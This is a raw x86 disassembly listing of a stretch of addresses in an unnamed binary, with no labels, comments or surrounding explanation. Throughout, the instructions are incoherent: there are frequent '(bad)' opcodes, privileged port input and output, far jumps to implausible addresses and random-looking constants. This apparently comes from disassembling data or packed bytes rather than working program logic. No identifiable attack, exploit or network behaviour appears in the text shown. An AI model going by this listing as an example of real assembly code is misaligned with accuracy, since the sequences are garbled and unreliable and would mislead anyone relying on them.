  40b653:	or     ecx,DWORD PTR [ebx+0x3ff0d778]
  40b659:	jne    0x40b687
  40b65b:	enter  0x20fe,0xa3
  40b65f:	ret    
  40b660:	jae    0x40b6bb
  40b662:	fcmovnb st,st(3)
  40b664:	(bad)  
  40b665:	out    dx,al
  40b666:	ret    0x35c3
  40b669:	xchg   edx,eax
  40b66a:	ja     0x40b6e3
  40b66c:	idiv   eax
  40b66e:	out    0xe4,al
  40b670:	add    BYTE PTR [ebp+0x7afed12e],cl
  40b676:	cs ret 
  40b678:	jae    0x40b600
  40b67a:	xor    al,0xfd
  40b67c:	push   edx
  40b67d:	push   0xffffffbe
  40b67f:	push   ds
  40b680:	adc    al,0x76
  40b682:	push   0xe832
  40b687:	add    BYTE PTR [eax],al
  40b689:	add    dl,dh
  40b68b:	pop    esp
  40b68c:	(bad)  
  40b68d:	inc    BYTE PTR ds:0x8701d7ab
  40b693:	jmp    0xebdf14bb
  40b698:	(bad)  
  40b699:	jmp    DWORD PTR [eax-0x787011b8]
  40b69f:	imul   eax,DWORD PTR [edx],0x25783585
  40b6a5:	xor    ebp,DWORD PTR [edi*4-0x160fa950]
  40b6ac:	inc    esp
  40b6ad:	sbb    BYTE PTR [edx-0x9a9f8a8],al
  40b6b3:	sbb    BYTE PTR [ebx],ah
  40b6b5:	je     0x40b723
  40b6b7:	sub    al,0xbc
  40b6b9:	not    BYTE PTR [ebx+0x6a03c42c]
  40b6bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6c0:	inc    ecx
  40b6c1:	inc    edx
  40b6c2:	scas   al,BYTE PTR es:[edi]
  40b6c3:	sbb    DWORD PTR [edi-0x18],eax
  40b6c6:	mov    gs,edx
  40b6c8:	jne    0x40b6dd
  40b6ca:	sub    eax,DWORD PTR [edx]
  40b6cc:	je     0x40b71a
  40b6ce:	rol    BYTE PTR [ebp+0xf633caf],cl
  40b6d4:	sahf   
  40b6d5:	add    BYTE PTR [edi],ch
  40b6d7:	or     ebp,0xffffffe4
  40b6da:	inc    esi
  40b6db:	or     DWORD PTR [edx-0x35],ebp
  40b6de:	stos   DWORD PTR es:[edi],eax
  40b6df:	sub    BYTE PTR [edx-0x3d],ch
  40b6e2:	jbe    0x40b71b
  40b6e4:	in     eax,dx
  40b6e5:	dec    ebx
  40b6e6:	sub    al,0x39
  40b6e8:	ret    
  40b6e9:	arpl   WORD PTR [esi-0x28],bx
  40b6ec:	push   ds
  40b6ed:	adc    eax,DWORD PTR [eax]
  40b6ef:	add    BYTE PTR [eax],al
  40b6f1:	add    BYTE PTR [eax],al
  40b6f3:	clc    
  40b6f4:	ret    0xf1e
  40b6f7:	clc    
  40b6f8:	push   cs
  40b6f9:	jmp    0x8198de52
  40b6fe:	sbb    eax,0xf785bf86
  40b703:	cmp    eax,0xb3107028
  40b708:	ret    
  40b709:	sbb    DWORD PTR [edx-0x59],ebx
  40b70c:	(bad)  [ecx-0x4c]
  40b70f:	imul   esi,DWORD PTR [edi-0x12],0xffffff90
  40b713:	ret    0xc6d2
  40b716:	xchg   BYTE PTR [ecx+ecx*1-0x22],cl
  40b71a:	or     BYTE PTR [edx+0x77],dh
  40b71d:	sub    ch,BYTE PTR [edi-0x7d6772a8]
  40b723:	cwde   
  40b724:	add    DWORD PTR [edx+0x9],0xffffffa2
  40b728:	pop    es
  40b729:	in     al,dx
  40b72a:	int3   
  40b72b:	and    eax,DWORD PTR [edx]
  40b72d:	jmp    0xb8ce1fe0
  40b732:	mov    ds:0x9228398,al
  40b737:	sbb    BYTE PTR [esi],0xec
  40b73a:	ins    BYTE PTR es:[edi],dx
  40b73b:	add    eax,DWORD PTR [edx]
  40b73d:	jmp    0xee76d6c9
  40b742:	or     esi,DWORD PTR [ecx+eax*2-0x45]
  40b746:	(bad)  
  40b748:	push   es
  40b749:	add    BYTE PTR [ecx],ch
  40b74b:	sbb    DWORD PTR [ebx],eax
  40b74d:	mov    al,ch
  40b74f:	arpl   WORD PTR [edx],ax
  40b751:	sub    DWORD PTR [edi+0x47b9ab78],0x0
  40b758:	add    BYTE PTR [eax],al
  40b75a:	add    BYTE PTR [eax],al
  40b75c:	cld    
  40b75d:	jle    0x40b7d3
  40b75f:	loope  0x40b75b
  40b761:	(bad)  [ebp+eiz*8+0x46]
  40b765:	add    ch,bl
  40b767:	jmp    0x40b711
  40b769:	jle    0x40b7c8
  40b76b:	and    dh,BYTE PTR [edx-0x43a74ab]
  40b771:	stos   BYTE PTR es:[edi],al
  40b772:	or     ebp,DWORD PTR [edx+0x4d]
  40b775:	mov    esi,0x8b2f39ff
  40b77a:	je     0x40b76d
  40b77c:	in     eax,0xa
  40b77e:	push   es
  40b77f:	bound  ebp,QWORD PTR ds:0x76c9830e
  40b785:	push   edi
  40b786:	mov    DWORD PTR [ecx+esi*1],esi
  40b789:	stc    
  40b78a:	lock out dx,al
  40b78c:	repz mov ecx,0x8976e8ff
  40b792:	inc    esp
  40b793:	fpatan 
  40b795:	fld    QWORD PTR [ecx]
  40b797:	jo     0x40b756
  40b799:	mov    dh,0xea
  40b79b:	in     al,0xfb
  40b79d:	or     BYTE PTR ss:[edx+0x2e],ah
  40b7a1:	cmp    DWORD PTR [ebp+edx*2+0x76],0x92bddd89
  40b7a9:	mov    ebp,eax
  40b7ab:	add    ah,al
  40b7ad:	xor    BYTE PTR [ebx+eiz*2],cl
  40b7b0:	xchg   al,bh
  40b7b2:	push   esp
  40b7b3:	aad    0x62
  40b7b5:	pop    es
  40b7b6:	inc    eax
  40b7b7:	loop   0x40b7f2
  40b7b9:	xor    al,0xf4
  40b7bb:	jb     0x40b78b
  40b7bd:	call   0x4161bf
  40b7c2:	add    BYTE PTR [eax],al
  40b7c4:	add    cl,dh
  40b7c6:	inc    esi
  40b7c7:	or     BYTE PTR [edx],al
  40b7c9:	gs push esp
  40b7cb:	lea    eax,[eax]
  40b7cd:	stc    
  40b7ce:	or     DWORD PTR [ebx+0x5b484f1],ecx
  40b7d4:	add    ah,cl
  40b7d6:	mov    esi,?
  40b7d8:	mov    edi,ecx
  40b7da:	jge    0x40b765
  40b7dc:	jne    0x40b7a6
  40b7de:	mov    WORD PTR [edx],cs
  40b7e0:	(bad)  
  40b7e1:	rol    BYTE PTR [ecx],1
  40b7e3:	add    BYTE PTR [eax],al
  40b7e5:	mov    ah,0x3
  40b7e7:	icebp  
  40b7e8:	jmp    FWORD PTR [ebx+0x200fbe8a]
  40b7ee:	das    
  40b7ef:	(bad)  
  40b7f0:	call   FWORD PTR [esp+eax*4+0x56c674fd]
  40b7f7:	mov    eax,edi
  40b7f9:	mov    ah,0xd0
  40b7fb:	sti    
  40b7fc:	(bad)  
  40b7fd:	fisttp DWORD PTR [edi-0x2ff803ad]
  40b803:	mov    DWORD PTR [ecx],ecx
  40b805:	adc    eax,0xcc85910a
  40b80a:	adc    eax,DWORD PTR [ebp+ecx*4-0x9fffea4]
  40b811:	xchg   ecx,eax
  40b812:	push   ss
  40b813:	add    DWORD PTR [edx+edi*2-0x71],esi
  40b817:	dec    ebx
  40b818:	cld    
  40b819:	xlat   BYTE PTR ds:[ebx]
  40b81a:	enter  0x89,0xc9
  40b81e:	or     cl,BYTE PTR [eax+0x74069483]
  40b824:	pop    edi
  40b825:	xlat   BYTE PTR ds:[ebx]
  40b826:	mov    dh,0x54
  40b828:	inc    DWORD PTR [eax]
  40b82a:	add    BYTE PTR [eax],al
  40b82c:	add    BYTE PTR [eax],al
  40b82e:	inc    ecx
  40b82f:	ins    DWORD PTR es:[edi],dx
  40b830:	adc    BYTE PTR [eax+0x1c],al
  40b833:	test   BYTE PTR [esi-0x2f49f182],bh
  40b839:	xor    ebp,DWORD PTR [ebx-0x7b]
  40b83c:	mov    esi,0xa8f427e
  40b841:	aaa    
  40b842:	pushf  
  40b843:	jns    0x40b863
  40b845:	je     0x40b84b
  40b847:	and    edi,0xbb2b7509
  40b84d:	add    eax,DWORD PTR [edx-0x51b8bb5b]
  40b853:	add    eax,DWORD PTR [eax-0x16]
  40b856:	sahf   
  40b857:	jmp    0x26e7f3ea
  40b85c:	push   esp
  40b85d:	push   eax
  40b85f:	sbb    BYTE PTR [esp+edx*1],bh
  40b862:	push   DWORD PTR [esi+0xacc7ffc]
  40b868:	cmp    BYTE PTR [eax],cl
  40b86a:	cmc    
  40b86b:	ror    DWORD PTR [ecx],0x80
  40b86e:	mov    esp,0x3d0437a6
  40b873:	icebp  
  40b874:	cmp    ch,ah
  40b876:	outs   dx,BYTE PTR ds:[esi]
  40b877:	jge    0x40b8b1
  40b879:	or     al,0xf8
  40b87b:	push   0x40
  40b87d:	or     BYTE PTR [ebp+0x14],al
  40b880:	pop    edx
  40b881:	call   0xff005260
  40b886:	mov    bl,0xa6
  40b888:	repnz (bad) 
  40b88a:	out    dx,eax
  40b88b:	in     eax,dx
  40b88c:	mov    ebx,0xf98f30fe
  40b891:	inc    esp
  40b892:	add    BYTE PTR [eax],al
  40b894:	add    BYTE PTR [eax],al
  40b896:	add    BYTE PTR [ebp-0x4c],bh
  40b899:	test   BYTE PTR [esi],cl
  40b89b:	push   0x3d
  40b89d:	ror    BYTE PTR [edx+0x5e6035b8],0xbe
  40b8a4:	(bad)  
  40b8a5:	les    ecx,FWORD PTR [edi]
  40b8a7:	jne    0x40b8d9
  40b8a9:	inc    esi
  40b8aa:	cld    
  40b8ab:	(bad)  
  40b8ac:	pop    ebx
  40b8ad:	stos   DWORD PTR es:[edi],eax
  40b8ae:	pop    edi
  40b8af:	inc    esp
  40b8b0:	push   ebp
  40b8b1:	rol    BYTE PTR [edx-0x1653b2d3],0xc8
  40b8b8:	xor    BYTE PTR [edi-0x7c51e67e],ch
  40b8be:	fs sbb eax,0xee5653aa
  40b8c4:	test   DWORD PTR [ebx+0x74027525],0x70537d17
  40b8ce:	inc    esi
  40b8cf:	add    DWORD PTR [edx-0x3fc04845],ecx
  40b8d5:	fld    QWORD PTR [ebp+esi*4-0xfc16fe]
  40b8dc:	or     ch,BYTE PTR [ecx-0x46]
  40b8df:	xor    BYTE PTR [esi],0xe3
  40b8e2:	sbb    ebp,0x9
  40b8e5:	ins    DWORD PTR es:[edi],dx
  40b8e6:	push   cs
  40b8e7:	cmc    
  40b8e8:	mov    ecx,0x427d3ef3
  40b8ed:	jo     0x40b938
  40b8ef:	shl    edi,0xaa
  40b8f2:	xor    dl,dl
  40b8f4:	imul   DWORD PTR [edx-0x179d09f1]
  40b8fa:	add    eax,DWORD PTR [eax]
  40b8fc:	add    BYTE PTR [eax],al
  40b8fe:	add    BYTE PTR [eax],al
  40b900:	jne    0x40b88a
  40b902:	loopne 0x40b894
  40b904:	sub    al,BYTE PTR [ecx]
  40b906:	imul   edi,DWORD PTR [ebx-0x7c1bc9ad],0x171be08f
  40b910:	cld    
  40b911:	cmp    eax,0x8846ab9d
  40b916:	in     eax,0x83
  40b918:	jge    0x40b8fc
  40b91a:	adc    al,0xf
  40b91c:	cmc    
  40b91d:	mov    eax,0x82703fef
  40b922:	jg     0x40b935
  40b924:	jecxz  0x40b92b
  40b926:	cs sti 
  40b928:	pop    esp
  40b929:	xor    BYTE PTR [ebx+0x40e7338b],al
  40b92f:	stos   DWORD PTR es:[edi],eax
  40b930:	xchg   edx,eax
  40b931:	cli    
  40b932:	std    
  40b933:	cmp    BYTE PTR [esi-0x11],ah
  40b936:	pop    ds
  40b937:	xchg   ecx,eax
  40b938:	mov    bl,0xbb
  40b93a:	inc    ecx
  40b93b:	add    dh,BYTE PTR [edx+ecx*2+0x36cefc69]
  40b942:	inc    eax
  40b943:	mov    dh,0x35
  40b945:	add    DWORD PTR [eax],eax
  40b947:	mov    ebp,0x333b436d
  40b94c:	inc    edi
  40b94d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b94e:	cmp    ah,BYTE PTR [ebx]
  40b950:	dec    esp
  40b951:	(bad)  
  40b952:	(bad)  
  40b953:	lods   al,BYTE PTR ds:[esi]
  40b954:	ret    0xde87
  40b957:	ret    0xbe95
  40b95a:	mov    bl,BYTE PTR [esi+ebp*1+0x7d740b8e]
  40b961:	add    al,BYTE PTR [eax]
  40b963:	jmp    0x40b968
  40b968:	add    BYTE PTR [esi],cl
  40b96a:	shr    esi,1
  40b96c:	neg    BYTE PTR [ebx]
  40b96e:	jg     0x40b92f
  40b970:	jne    0x40b93e
  40b972:	test   edx,ebx
  40b974:	pop    esp
  40b975:	jg     0x40b966
  40b977:	mov    edi,0x40305951
  40b97c:	jmp    0xce4560b7
  40b981:	ins    DWORD PTR es:[edi],dx
  40b982:	mov    esi,0x59deaa8a
  40b987:	cld    
  40b988:	mov    esi,0x620d87e3
  40b98d:	cmp    eax,0xe9e588ba
  40b992:	test   DWORD PTR [edi+0x44bb631d],edi
  40b998:	mov    eax,ds:0x2ef455ef
  40b99d:	call   0x3ba3b5df
  40b9a2:	stos   DWORD PTR es:[edi],eax
  40b9a3:	xchg   BYTE PTR ss:[ebx],ch
  40b9a6:	mov    ecx,0xad21248a
  40b9ab:	or     al,0x62
  40b9ad:	lods   eax,DWORD PTR ds:[esi]
  40b9ae:	mov    edx,0x221eaf8a
  40b9b3:	lock or ax,WORD PTR [ebp+0x58a35ec7]
  40b9bb:	pop    ebx
  40b9bc:	and    BYTE PTR [edi],dh
  40b9be:	dec    edi
  40b9bf:	mov    edi,DWORD PTR ds:0xbadf7
  40b9c5:	lahf   
  40b9c6:	jmp    0xf28b:0x4fff00f7
  40b9cd:	add    BYTE PTR [eax],al
  40b9cf:	add    BYTE PTR [eax],al
  40b9d1:	add    BYTE PTR [edi+0x408cfe9f],cl
  40b9d7:	dec    esi
  40b9d8:	push   edi
  40b9d9:	mov    ecx,ebx
  40b9db:	jns    0x40b964
  40b9dd:	pop    ebp
  40b9de:	push   0x8f0fc1bc
  40b9e3:	(bad)  
  40b9e5:	(bad)  
  40b9e6:	fmul   QWORD PTR [eax]
  40b9e8:	mov    bh,0x8
  40b9ea:	pop    edi
  40b9eb:	jbe    0x40ba0b
  40b9ed:	je     0x40b9d5
  40b9ef:	test   bh,dh
  40b9f1:	or     DWORD PTR [esi+0x8],ebx
  40b9f4:	cmp    ecx,0xffffffb1
  40b9f7:	lock or DWORD PTR [ebx+0x4589051c],eax
  40b9fe:	mov    al,ds:0xa872c1bb
  40ba03:	mov    ebx,0x351f0fc1
  40ba08:	(bad)  
  40ba09:	call   FWORD PTR [esi+eax*1-0x9eef749]
  40ba10:	add    DWORD PTR [ebx+0x5729fe5],eax
  40ba16:	pop    ds
  40ba17:	jge    0x40ba39
  40ba19:	jne    0x40ba8b
  40ba1b:	mov    ecx,edi
  40ba1d:	mov    DWORD PTR [ecx-0x3e],esp
  40ba20:	jmp    0xe6f4d62
  40ba25:	add    DWORD PTR ds:0xdf11729e,0x7d
  40ba2c:	pop    es
  40ba2d:	jb     0x40ba88
  40ba2f:	xor    bh,0xd
  40ba32:	pop    edx
  40ba33:	inc    BYTE PTR [edx+0xc7]
  40ba39:	add    BYTE PTR [eax],al
  40ba3b:	pop    esi
  40ba3c:	mov    edx,0x8bbb72f9
  40ba41:	(bad)  [ebx]
  40ba43:	mov    ah,0x6b
  40ba45:	sub    eax,0x15127566
  40ba4a:	jne    0x40b9d7
  40ba4c:	sbb    al,0xcb
  40ba4e:	mov    WORD PTR [edx-0x4bfc56bf],?
  40ba54:	sub    al,0xac
  40ba56:	add    DWORD PTR [ebx-0x76a403d4],edx
  40ba5c:	icebp  
  40ba5d:	mov    ch,0xc0
  40ba5f:	je     0x40b9f8
  40ba61:	add    eax,DWORD PTR [ebx-0x50852c6]
  40ba67:	xchg   ecx,esi
  40ba69:	clc    
  40ba6a:	cli    
  40ba6b:	push   0xe96c7f9f
  40ba70:	lods   al,BYTE PTR ds:[esi]
  40ba71:	xchg   esi,ebx
  40ba73:	mov    ss,WORD PTR [esi-0x4cd77542]
  40ba79:	lea    ecx,[ebx]
  40ba7b:	add    BYTE PTR [edi+0x7a750002],bl
  40ba81:	mov    bh,0xe7
  40ba83:	mov    eax,0xf1febbc8
  40ba88:	push   0x36
  40ba8a:	cmp    al,0xf8
  40ba8c:	jae    0x40bac3
  40ba8e:	or     ah,BYTE PTR [esi+0x6b]
  40ba91:	sub    ah,BYTE PTR [esi+eiz*1-0x71bffc15]
  40ba98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba99:	mov    ebx,0xc0239174
  40ba9e:	out    0x0,eax
  40baa0:	add    BYTE PTR [eax],al
  40baa2:	add    BYTE PTR [eax],al
  40baa4:	jp     0x40bb0a
  40baa6:	mov    ebx,0x87a8eefe
  40baab:	push   esp
  40baac:	jge    0x40bacf
  40baae:	pop    es
  40baaf:	xchg   ecx,eax
  40bab0:	clc    
  40bab1:	imul   esi,DWORD PTR [esi],0xbbe76a18
  40bab7:	mov    al,al
  40bab9:	sub    eax,0x2277c680
  40babe:	ds cld 
  40bac0:	(bad)  
  40bac1:	pusha  
  40bac2:	test   eax,0x66034a22
  40bac7:	mov    esp,0xa8613def
  40bacc:	imul   ecx,DWORD PTR [ebx-0x7004455],0xb81a5a40
  40bad6:	inc    ebp
  40bad7:	cmp    BYTE PTR [edx],0xb8
  40bada:	popf   
  40badb:	pop    ebp
  40badc:	mov    esi,0xfe5629c9
  40bae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bae2:	imul   ebp,DWORD PTR [edi-0xf40ac9a],0xbcda501f
  40baec:	in     eax,dx
  40baed:	push   ebp
  40baee:	sbb    eax,0xcfba518a
  40baf3:	pop    esi
  40baf4:	jns    0x40bafd
  40baf6:	outs   dx,DWORD PTR ds:[esi]
  40baf7:	push   0x88e8b7e2
  40bafc:	sub    DWORD PTR [edx-0x7a82b99f],edi
  40bb02:	in     al,0x8b
  40bb04:	call   DWORD PTR [edx]
  40bb06:	scas   eax,DWORD PTR es:[edi]
  40bb07:	inc    ecx
  40bb08:	add    BYTE PTR [eax],al
  40bb0a:	add    BYTE PTR [eax],al
  40bb0c:	add    dl,al
  40bb0e:	add    dh,BYTE PTR [eax+0x41]
  40bb11:	leave  
  40bb12:	mov    esp,DWORD PTR [edx+0x6a2089af]
  40bb18:	mov    esp,0x21e02e8a
  40bb1d:	idiv   BYTE PTR [edx+0x207335ef]
  40bb23:	push   0xffffffbc
  40bb25:	xor    DWORD PTR [eax],0x4b586dc
  40bb2b:	div    BYTE PTR [edx+0x75]
  40bb2e:	and    BYTE PTR [esp+eax*8+0x1],ah
  40bb32:	mov    ds:0x3d3b0081,eax
  40bb37:	mov    es,WORD PTR ds:0x93dbb7c7
  40bb3d:	test   BYTE PTR [edx-0x17],al
  40bb40:	mov    BYTE PTR [esi-0x6],ch
  40bb43:	jmp    DWORD PTR [ebx-0x43]
  40bb46:	or     DWORD PTR [eax],ecx
  40bb48:	pop    esp
  40bb49:	test   BYTE PTR [esi-0x60f95378],ch
  40bb4f:	add    al,0x4f
  40bb51:	(bad)  
  40bb52:	mov    bh,0x83
  40bb54:	sub    DWORD PTR [ebp+0x58],esp
  40bb57:	or     esp,0xffffffee
  40bb5a:	mov    dh,0x89
  40bb5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb5d:	shr    BYTE PTR [eax+ecx*1],cl
  40bb60:	rcl    DWORD PTR [esi],cl
  40bb62:	dec    edi
  40bb63:	pushaw 
  40bb65:	jne    0x40bba2
  40bb67:	inc    edi
  40bb68:	imul   ecx,DWORD PTR [edi+esi*4-0x1],0x222c6e9c
  40bb70:	rol    DWORD PTR [eax],0x0
  40bb73:	add    BYTE PTR [eax],al
  40bb75:	add    BYTE PTR [ecx+ecx*4+0x3],dl
  40bb79:	xchg   edx,eax
  40bb7a:	aaa    
  40bb7b:	mov    eax,DWORD PTR [ebp+edi*8+0x2f]
  40bb7f:	out    0x8a,eax
  40bb81:	lods   al,BYTE PTR ds:[esi]
  40bb82:	xchg   BYTE PTR es:[ebx],dh
  40bb85:	or     BYTE PTR [esi],0xb1
  40bb88:	clc    
  40bb89:	test   BYTE PTR [edi],0x4
  40bb8c:	jge    0x40bb87
  40bb8e:	div    BYTE PTR ds:0x892e9ff
  40bb94:	push   0xb
  40bb96:	sbb    DWORD PTR [eax],esp
  40bb98:	mov    ebp,ebp
  40bb9a:	jae    0x40bbdb
  40bb9c:	xor    ebp,DWORD PTR [ecx+0x42038954]
  40bba2:	fidivr WORD PTR ds:0xba3572f8
  40bba8:	cmp    ch,BYTE PTR [edi*2-0x31eb7df9]
  40bbaf:	mov    bh,0xfe
  40bbb1:	jb     0x40bb6e
  40bbb3:	push   edi
  40bbb4:	pop    esi
  40bbb5:	inc    edx
  40bbb6:	test   al,0xc0
  40bbb8:	pop    es
  40bbb9:	jmp    0x8234eaed
  40bbbe:	int    0xa4
  40bbc0:	inc    BYTE PTR [eax]
  40bbc2:	sti    
  40bbc3:	lods   al,BYTE PTR ds:[esi]
  40bbc4:	mov    esi,0x8b52e9eb
  40bbc9:	in     al,dx
  40bbca:	jb     0x40bc1d
  40bbcc:	mov    edi,ecx
  40bbce:	xlat   BYTE PTR ds:[ebx]
  40bbcf:	dec    edx
  40bbd0:	or     BYTE PTR [ebx+0x75c7829c],cl
  40bbd6:	dec    eax
  40bbd7:	cmp    ebp,0x74
  40bbda:	add    BYTE PTR [eax],al
  40bbdc:	add    BYTE PTR [eax],al
  40bbde:	add    BYTE PTR [eax],dh
  40bbe0:	jge    0x40bba8
  40bbe2:	push   DWORD PTR [ebp+0xcfffe8d]
  40bbe8:	cmp    ebp,0x75
  40bbeb:	or     ebp,DWORD PTR [ebp-0x6e4abf42]
  40bbf1:	(bad)  
  40bbf2:	call   FWORD PTR [ebp*4+0x185e9be]
  40bbf9:	add    BYTE PTR [eax],al
  40bbfb:	mov    edi,0xeeec1b84
  40bc00:	inc    ecx
  40bc01:	add    BYTE PTR [ebx+0x3073787a],al
  40bc07:	dec    edi
  40bc08:	cli    
  40bc09:	or     edi,edi
  40bc0b:	popa   
  40bc0c:	lahf   
  40bc0d:	mov    BYTE PTR [edi],al
  40bc0f:	fstp   TBYTE PTR [ebx]
  40bc11:	xor    BYTE PTR [edi],cl
  40bc13:	call   0x2b53:0x21f229d1
  40bc1a:	iret   
  40bc1b:	push   eax
  40bc1c:	mov    esi,0x84635172
  40bc21:	add    eax,0x37b2fa0f
  40bc26:	psubd  mm1,mm6
  40bc29:	sub    edx,esi
  40bc2b:	pusha  
  40bc2c:	push   0x7b6d41e9
  40bc31:	ror    DWORD PTR [ebx-0xf74f997],1
  40bc37:	paddsw mm1,QWORD PTR [ebx]
  40bc3a:	jmp    DWORD PTR [ecx+0x9]
  40bc3d:	push   edi
  40bc3e:	push   DWORD PTR [ebp+0x78]
  40bc41:	mov    WORD PTR [eax+eax*1+0x0],cs
  40bc45:	add    BYTE PTR [eax],al
  40bc47:	add    BYTE PTR [ebp+0x22],bh
  40bc4a:	aas    
  40bc4b:	or     al,0xee
  40bc4d:	adc    eax,0xae673b08
  40bc52:	loope  0x40bbd8
  40bc54:	dec    ebx
  40bc55:	mov    bh,0x15
  40bc57:	test   DWORD PTR [edi],esp
  40bc59:	scas   eax,DWORD PTR es:[edi]
  40bc5a:	sbb    DWORD PTR [ebx],esi
  40bc5c:	xor    eax,0x607dd626
  40bc61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc62:	js     0x40bc94
  40bc64:	or     BYTE PTR [ebp-0x31d9d4e8],0xb
  40bc6b:	inc    ecx
  40bc6c:	mov    edx,0x99c1fb6b
  40bc71:	inc    esp
  40bc72:	lods   eax,DWORD PTR ds:[esi]
  40bc73:	add    DWORD PTR [esi-0x7],ebx
  40bc76:	hlt    
  40bc77:	enter  0xecf0,0x8
  40bc7b:	lahf   
  40bc7c:	xor    al,0x30
  40bc7e:	ret    0x1df6
  40bc81:	add    ah,al
  40bc83:	pop    edx
  40bc84:	add    BYTE PTR [edi+0x9],bl
  40bc87:	call   DWORD PTR [esi+0x405e58ea]
  40bc8d:	jmp    0x3080bc9d
  40bc92:	test   al,0x55
  40bc94:	sub    ah,BYTE PTR [eax]
  40bc96:	mov    ebx,0x8ba3388a
  40bc9b:	out    dx,eax
  40bc9c:	clc    
  40bc9d:	jno    0x40bccc
  40bc9f:	or     al,0xf0
  40bca1:	shr    DWORD PTR [esi],cl
  40bca3:	adc    al,0xf6
  40bca5:	bound  esi,QWORD PTR [edi+0x2ab0ae8]
  40bcab:	add    BYTE PTR [eax],al
  40bcad:	add    BYTE PTR [eax],al
  40bcaf:	add    BYTE PTR [eax],al
  40bcb1:	clc    
  40bcb2:	mov    ebx,0x6b660f2d
  40bcb7:	inc    edx
  40bcb8:	jmp    0x4367a3
  40bcbd:	inc    esi
  40bcbe:	imul   ebp,DWORD PTR [ecx-0x16fd8a75],0x3
  40bcc5:	es mov ebx,edi
  40bcc8:	xchg   ebx,eax
  40bcc9:	test   BYTE PTR [edx-0x17],al
  40bccc:	test   BYTE PTR [eax-0x4c],ch
  40bccf:	adc    ebp,ecx
  40bcd1:	div    DWORD PTR ds:0xe1e1b8f5
  40bcd7:	in     eax,dx
  40bcd8:	jo     0x40bd55
  40bcda:	add    edi,DWORD PTR [esi]
  40bcdc:	repnz lahf 
  40bcde:	mov    dl,0xf3
  40bce0:	push   edi
  40bce1:	mov    es,ebx
  40bce3:	into   
  40bce4:	jle    0x40bce0
  40bce6:	cs mov ah,0x84
  40bce9:	cmp    eax,DWORD PTR [ecx]
  40bceb:	out    0x70,al
  40bced:	jae    0x40bcf2
  40bcef:	xchg   esi,eax
  40bcf0:	out    dx,eax
  40bcf1:	pop    ebp
  40bcf2:	out    0x38,eax
  40bcf4:	das    
  40bcf5:	or     BYTE PTR [eax-0x2fedad5d],ch
  40bcfb:	popa   
  40bcfc:	inc    esi
  40bcfd:	jge    0x40bc86
  40bcff:	cmp    BYTE PTR [ecx+eax*4+0x6c2e2606],al
  40bd06:	dec    ebx
  40bd07:	push   ds
  40bd08:	aam    0xff
  40bd0a:	inc    ebp
  40bd0b:	loope  0x40bc97
  40bd0d:	xor    DWORD PTR [esi],eax
  40bd0f:	bound  ecx,QWORD PTR [esi+0x71]
  40bd12:	idiv   edx
  40bd14:	sub    eax,0x0
  40bd19:	add    BYTE PTR [eax-0x6bd10983],dl
  40bd1f:	jge    0x40bd3b
  40bd21:	das    
  40bd22:	push   0xa47e28ef
  40bd27:	xor    al,0x0
  40bd29:	pop    es
  40bd2a:	add    dh,dl
  40bd2c:	in     eax,dx
  40bd2d:	outs   dx,BYTE PTR ds:[esi]
  40bd2e:	xchg   ebx,eax
  40bd2f:	out    0xd9,eax
  40bd31:	xor    DWORD PTR [edx+0x7f],edi
  40bd34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd35:	add    dh,dh
  40bd37:	mov    ebx,0xc05e43ea
  40bd3c:	cmp    al,0xab
  40bd3e:	lahf   
  40bd3f:	add    BYTE PTR [eax],al
  40bd41:	add    al,bh
  40bd43:	lock enter 0xd364,0x4
  40bd48:	lahf   
  40bd49:	test   al,0xee
  40bd4b:	mov    ebp,0xc28ec1f6
  40bd50:	pop    edx
  40bd51:	fs mov ebp,0x39caff09
  40bd57:	push   esp
  40bd58:	pop    esi
  40bd59:	and    al,0x37
  40bd5b:	sti    
  40bd5c:	call   DWORD PTR [ecx-0x236078c]
  40bd62:	jge    0x40bda6
  40bd64:	mov    ah,cl
  40bd66:	ret    0x74ca
  40bd69:	pop    esp
  40bd6a:	aas    
  40bd6b:	leave  
  40bd6c:	jae    0x40bd59
  40bd6e:	daa    
  40bd6f:	jae    0x40bd33
  40bd71:	inc    edx
  40bd72:	js     0x40bd90
  40bd74:	adc    DWORD PTR [eax-0x47],0x2e
  40bd78:	adc    ebp,DWORD PTR [edx+0x31]
  40bd7b:	add    DWORD PTR [edi],ecx
  40bd7d:	jbe    0x40bd7f
  40bd7f:	add    BYTE PTR [eax],al
  40bd81:	add    BYTE PTR [eax],al
  40bd83:	sbb    DWORD PTR [eax*4+0x65a34420],0x73f3016a
  40bd8e:	jmp    0x40bd97
  40bd90:	jae    0x40bd54
  40bd92:	mov    ah,0xff
  40bd94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd95:	push   eax
  40bd96:	bound  esi,QWORD PTR [edx+ecx*1]
  40bd99:	mov    DWORD PTR [edx+ebp*1+0x7586da7e],esp
  40bda0:	jg     0x40bd69
  40bda2:	inc    cl
  40bda4:	mov    edi,0x17c56455
  40bda9:	push   esi
  40bdaa:	xchg   esi,eax
  40bdab:	push   cs
  40bdac:	sub    ah,0xe6
  40bdaf:	add    eax,DWORD PTR [esi-0x4cb912bc]
  40bdb5:	je     0x40bd8c
  40bdb7:	inc    edi
  40bdb8:	dec    ebx
  40bdb9:	push   esp
  40bdbb:	adc    BYTE PTR es:[eax+0x0],al
  40bdbf:	mov    WORD PTR [edi+0x3b0566c7],gs
  40bdc5:	ds (bad) 
  40bdc7:	bound  edi,QWORD PTR [edi-0xa]
  40bdca:	dec    DWORD PTR [ecx+0x5]
  40bdcd:	push   edi
  40bdce:	(bad)  
  40bdcf:	jns    0x40bd5f
  40bdd1:	adc    BYTE PTR [eax+0x5c],al
  40bdd4:	mov    edi,0x101533c1
  40bdd9:	mov    DWORD PTR [ebx+ebx*4],ecx
  40bddc:	mov    edi,0x59e753c1
  40bde1:	and    al,0x8
  40bde3:	fnstcw WORD PTR [eax+0x7d]
  40bde6:	add    eax,0x0
  40bdeb:	add    bh,bl
  40bded:	mov    ebp,0x410f5bfd
  40bdf2:	push   esi
  40bdf3:	call   0x3e198b
  40bdf8:	mov    eax,ds:0xec0c23f1
  40bdfd:	push   esp
  40bdfe:	push   edi
  40bdff:	push   esi
